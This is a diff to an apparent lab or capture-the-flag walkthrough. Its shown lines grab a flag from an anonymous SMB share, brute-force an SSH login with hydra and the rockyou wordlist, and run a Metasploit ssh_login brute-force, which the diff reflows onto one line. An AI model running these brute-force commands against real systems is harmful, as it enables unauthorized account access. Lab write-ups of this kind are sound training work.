@@ -48,8 +48,7 @@ smbclient //172.28.0.31/public -N -c 'get flag.txt'
 hydra -t 4 -l svc -P /usr/share/wordlists/rockyou.txt -f ssh://172.28.0.32
 ssh svc@172.28.0.32   # password from hydra
 
-msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 172.28.0.32; \
-  set USERNAME svc; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; sessions -l; exit'
+msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 172.28.0.32; set USERNAME svc; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; sessions -l; exit'
 ```
 
 Use `-t 4`: at hydra's default 16 parallel tasks the SSH server drops the
